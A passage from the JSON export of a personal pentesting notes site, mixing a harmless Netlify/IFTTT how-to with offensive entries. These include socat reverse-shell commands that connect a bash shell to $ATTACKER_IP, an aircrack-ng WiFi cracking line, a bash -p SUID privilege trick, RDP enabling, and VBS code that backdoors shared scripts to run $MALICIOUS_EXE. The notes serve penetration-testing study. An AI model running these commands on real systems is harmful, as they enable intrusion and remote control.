fDenyTSConnections &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;t REG_DWORD &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;d &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;f&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This requires SYSTEM privileges or a (local) administrator account.&lt;/p&gt;\n&lt;p&gt;It’s worth noting that users added via &lt;code&gt;net user&lt;/code&gt; seem to bypass Windows’ password policies…&lt;/p&gt;"},"spells/Aircrack-NG":{"slug":"spells/Aircrack-NG","filePath":"spells/Aircrack-NG.md","title":"Aircrack-NG","links":[],"tags":["Application/Aircrack","AttackCycle/Reconnaissance","AttackCycle/Exploitation","Protocol/WiFi"],"content":"aircrack-ng -b $BSSID -w $WORLDLIST_FILE $CAP_FILE","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;aircrack-ng&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -b&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $BSSID&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -w&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $WORLDLIST_FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $CAP_FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/Automate-Netlify-builds-with-IFTTT":{"slug":"spells/Automate-Netlify-builds-with-IFTTT","filePath":"spells/Automate Netlify builds with IFTTT.md","title":"Automate Netlify builds with IFTTT","links":[],"tags":["HowTo","WebApplication/Netlify","WebApplication/IFTTT"],"content":"\n\n                  \n                  Note\n                  \n                \n\n\nAdapted from Eleventy’s documentation.\n\n\n\nIn Netlify\n\nGo into your Netlify site’s “Build &amp; Deploy” settings.\nSelect “Continuous Deployment”.\nAdd a “Build hook”.\nName it whatever you’d like and select the appropriate branch.\nSave this and Netlify will provide you with a long URL like api.netlify.com/build_hooks/SOME_ID_HERE. This is the URL you want.\n\nIn IFTTT\n\nGo to “New Applet” on IFTTT.\nClick “+this”.\nSelect the “Date &amp; Time” service.\nSelect the interval you want to use and set the time (and optionally date) you want to use. In most cases, defining one or more “Every day at” triggers will be the right approach.\nClick “+that”.\nSelect the “Webhooks” service.\nSelect the “Make a web request” option.\nFor the “URL” field, use the build hook URL you retrieve above from Netlify.\nFor the “Method” field, choose “POST”.\nFor the “Content Type” field, choose application/x-www-form-urlencoded.\nFor the “Body” field, type {}.\nClick the “Create action” button.\nRename the new applet and click “Finish”.\n","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Adapted from &lt;a href=&quot;https://www.11ty.dev/docs/quicktips/netlify-ifttt/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Eleventy’s documentation&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;h2 id=&quot;in-netlify&quot;&gt;In Netlify&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#in-netlify&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;ul&gt;\n&lt;li&gt;Go into your &lt;a href=&quot;https://www.netlify.com&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Netlify&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; site’s “Build &amp;#x26; Deploy” settings.&lt;/li&gt;\n&lt;li&gt;Select “Continuous Deployment”.&lt;/li&gt;\n&lt;li&gt;Add a “Build hook”.&lt;/li&gt;\n&lt;li&gt;Name it whatever you’d like and select the appropriate branch.&lt;/li&gt;\n&lt;li&gt;Save this and Netlify will provide you with a long URL like &lt;code&gt;https://api.netlify.com/build_hooks/SOME_ID_HERE&lt;/code&gt;. This is the URL you want.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h2 id=&quot;in-ifttt&quot;&gt;In IFTTT&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#in-ifttt&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;ul&gt;\n&lt;li&gt;Go to “New Applet” on &lt;a href=&quot;https://ifttt.com&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;IFTTT&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/li&gt;\n&lt;li&gt;Click “+this”.&lt;/li&gt;\n&lt;li&gt;Select the “Date &amp;#x26; Time” service.&lt;/li&gt;\n&lt;li&gt;Select the interval you want to use and set the time (and optionally date) you want to use. In most cases, defining one or more “Every day at” triggers will be the right approach.&lt;/li&gt;\n&lt;li&gt;Click “+that”.&lt;/li&gt;\n&lt;li&gt;Select the “Webhooks” service.&lt;/li&gt;\n&lt;li&gt;Select the “Make a web request” option.&lt;/li&gt;\n&lt;li&gt;For the “URL” field, use the build hook URL you retrieve above from Netlify.&lt;/li&gt;\n&lt;li&gt;For the “Method” field, choose “POST”.&lt;/li&gt;\n&lt;li&gt;For the “Content Type” field, choose &lt;code&gt;application/x-www-form-urlencoded&lt;/code&gt;.&lt;/li&gt;\n&lt;li&gt;For the “Body” field, type &lt;code&gt;{}&lt;/code&gt;.&lt;/li&gt;\n&lt;li&gt;Click the “Create action” button.&lt;/li&gt;\n&lt;li&gt;Rename the new applet and click “Finish”.&lt;/li&gt;\n&lt;/ul&gt;"},"spells/Automatically-stabilize-a-reverse-shell-with-socat":{"slug":"spells/Automatically-stabilize-a-reverse-shell-with-socat","filePath":"spells/Automatically stabilize a reverse shell with socat.md","title":"Automatically stabilize a reverse shell with socat","links":["spells/Shell-stabilization","spells/socat"],"tags":["HowTo","Application/socat"],"content":"Shell “stabilization” refers to the process of making a remote shell behave like a normal local shell — so, allowing interactive programs to work properly, ensuring that input is not echoed inappropriately, etc.\nWe can use socat to create an auto-stabilized reverse shell on UNIX-like systems.\n# Attacker: Connect $LISTENER_PORT to the current TTY,\n# send raw keycodes, and turn off terminal echo.\n# Basically the `stty raw -echo`.\n#\nsocat TCP-LISTEN:$LISTENER_PORT FILE:`tty`,raw,echo=0\n \n# Target: Connect the listener on the attacker to an\n# interactive login bash shell.\n#\n#     pty    - allocate a PTTY\n#     stderr - redirect STDERR to the attacker\n#     sigint - pass signals (Ctrl+C) through\n#     setsid - use a new session\n#     sane   - use a variety of tweaks to &quot;normalize&quot; the\n#              terminal&#039;s environment\n#\nsocat TCP:$ATTACKER_IP:$LISTENER_PORT \\\n      EXEC:&quot;/bin/bash -li&quot;,pty,stderr,sigint,setsid,sane\nSame thing, but over an encrypted connection:\n# Attacker: Connect $LISTENER_PORT to the current TTY,\n# send raw keycodes, and turn off terminal echo. Basically\n# the `stty raw -echo`.\n#\nsocat \\\n\tOPENSSL-LISTEN:$LISTENER_PORT,cert=$PEM_FILE,verify=0 \\\n\tFILE:`tty`,raw,echo=0\n \n# Target: Connect the listener on the attacker to an\n# interactive login bash shell.\n#\n#     pty    - allocate a PTTY\n#     stderr - redirect STDERR to the attacker\n#     sigint - pass signals (Ctrl+C) through\n#     setsid - use a new session\n#     sane   - use a variety of tweaks to &quot;normalize&quot; the\n#              terminal&#039;s environment\n#\nsocat \\\n\tOPENSSL:$ATTACKER_IP:$LISTENER_PORT,verify=0 \\\n\tEXEC:&quot;/bin/bash -li&quot;,pty,stderr,sigint,setsid,sane\n\n\n                  \n                  Tip\n                  \n                \n\n\nThe reverse shell will not pick up on your terminal size, so you’ll need to manually specify it using stty rows and stty cols.\n\n\n","richContent":"&lt;p&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Shell-stabilization&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Shell-stabilization&quot;&gt;Shell “stabilization”&lt;/a&gt; refers to the process of making a remote shell behave like a normal local shell — so, allowing interactive programs to work properly, ensuring that input is not echoed inappropriately, etc.&lt;/p&gt;\n&lt;p&gt;We can use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/socat&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/socat&quot;&gt;socat&lt;/a&gt; to create an auto-stabilized reverse shell on UNIX-like systems.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Attacker: Connect $LISTENER_PORT to the current TTY,&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# send raw keycodes, and turn off terminal echo.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Basically the `stty raw -echo`.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;socat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; TCP-LISTEN:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$LISTENER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; FILE:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;`&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;tty&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;`&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;,raw,echo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;=0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Target: Connect the listener on the attacker to an&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# interactive login bash shell.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#     pty    - allocate a PTTY&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#     stderr - redirect STDERR to the attacker&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#     sigint - pass signals (Ctrl+C) through&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#     setsid - use a new session&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#     sane   - use a variety of tweaks to &quot;normalize&quot; the&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#              terminal&#039;s environment&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;socat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; TCP:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$LISTENER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;      EXEC:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/bin/bash -li&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;,pty,stderr,sigint,setsid,sane&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Same thing, but over an encrypted connection:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Attacker: Connect $LISTENER_PORT to the current TTY,&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# send raw keycodes, and turn off terminal echo. Basically&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# the `stty raw -echo`.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;socat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tOPENSSL-LISTEN:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$LISTENER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;,cert=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$PEM_FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;,verify=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tFILE:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;`&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;tty&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;`&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;,raw,echo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;=0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Target: Connect the listener on the attacker to an&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# interactive login bash shell.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#     pty    - allocate a PTTY&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#     stderr - redirect STDERR to the attacker&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#     sigint - pass signals (Ctrl+C) through&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#     setsid - use a new session&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#     sane   - use a variety of tweaks to &quot;normalize&quot; the&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#              terminal&#039;s environment&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;socat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tOPENSSL:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$ATTACKER_IP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;$LISTENER_PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;,verify=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tEXEC:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;/bin/bash -li&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;,pty,stderr,sigint,setsid,sane&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;blockquote class=&quot;callout tip&quot; data-callout=&quot;tip&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Tip&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;The reverse shell will not pick up on your terminal size, so you’ll need to manually specify it using &lt;code&gt;stty rows&lt;/code&gt; and &lt;code&gt;stty cols&lt;/code&gt;.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;"},"spells/Avoid-dropping-privileges-with-SUID-Bash":{"slug":"spells/Avoid-dropping-privileges-with-SUID-Bash","filePath":"spells/Avoid dropping privileges with SUID Bash.md","title":"Avoid dropping privileges with SUID Bash","links":[],"tags":["Language/Bash","AttackCycle/Exploitation","HowTo"],"content":"Bash will drop privileges by default if SUID. To avoid this, simply supply the -p flag.","richContent":"&lt;p&gt;Bash will drop privileges by default if SUID. To avoid this, simply supply the &lt;code&gt;-p&lt;/code&gt; flag.&lt;/p&gt;"},"spells/Backdoor-Visual-Basic-Scripts":{"slug":"spells/Backdoor-Visual-Basic-Scripts","filePath":"spells/Backdoor Visual Basic Scripts.md","title":"Backdoor Visual Basic Scripts","links":["spells/Visual-Basic-for-Applications"],"tags":["AttackCycle/Exploitation","HowTo","Language/VisualBasic","FileFormat/VBS","Protocol/SMB","OS/Windows"],"content":"\n\n                  \n                  Important\n                  \n                \n\n\nDo not confuse Visual Basic scripts (.vbs files) with Visual Basic for Applications!\n\n\n\nVBS code to copy a file from a share and then execute it locally. This is useful for backdooring VBS scripts on shares.\nCreateObject(&quot;WScript.Shell&quot;).Run &quot;cmd.exe /c copy /Y \\\\$SHARE_NAME\\$SHARE_PATH\\$MALICIOUS_EXE %TEMP% &amp; %TEMP%\\$MALICIOUS_EXE $OPTIONAL_ARGUMENTS&quot;, 0, True","richContent":"&lt;blockquote class=&quot;callout important&quot; data-callout=&quot;important&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Important&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Do not confuse Visual Basic scripts (.vbs files) with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Visual-Basic-for-Applications&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Visual-Basic-for-Applications&quot;&gt;Visual Basic for Applications&lt;/a&gt;!&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;VBS code to copy a file from a share and then execute it locally. This is useful for backdooring VBS scripts on shares.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;vb&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;vb&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;CreateObject&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;WScript.Shell&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span 